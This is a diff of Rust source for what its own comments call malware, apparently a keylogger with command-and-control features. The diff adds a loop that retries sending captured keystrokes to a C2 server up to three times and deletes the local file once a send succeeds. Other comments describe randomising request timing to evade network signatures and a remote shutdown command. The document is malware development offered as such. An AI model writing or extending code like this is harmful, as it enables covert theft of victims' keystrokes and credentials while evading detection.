@@ -148,9 +148,23 @@ iwIDAQAB
             }
 
             let key_stroke = read_file();
-            if server_for_exfil.send_data(&id_exfil, &key_stroke.clone()).await.is_ok() {
-                delete_file();
+
+
+            //gets a max of 3 tries to send exil data to c2 server
+            for n in 0..3{
+                if server_for_exfil.send_data(&id_exfil, &key_stroke.clone()).await.is_ok() {
+                    delete_file();
+                    break;
+                }
+
+                if n >=3 {
+                    //sleep for 300 secs if it does not exfil properly
+                    paused_exfil.store(true, Ordering::Relaxed);
+                    sleep(Duration::from_secs(300)).await;
+                    paused_exfil.store(false, Ordering::Relaxed);
+                }
             }
+
 
             //makes it so that the malware sends requests at random intervals.
             //this makes the malware activity more sparatic, and therefore harder to form network signature
@@ -205,7 +219,7 @@ async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
                 paused.store(true, Ordering::Relaxed);
                 sleep(Duration::from_secs(secs)).await;
                 paused.store(false, Ordering::Relaxed);
-                print!("[Debugging]: Wakeed up now")
+                print!("[Debugging]: Waked up now")
             }
         }
         //if it's shd shut down the malware
@@ -220,3 +234,4 @@ async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
         _ => {}
     }
 }
+
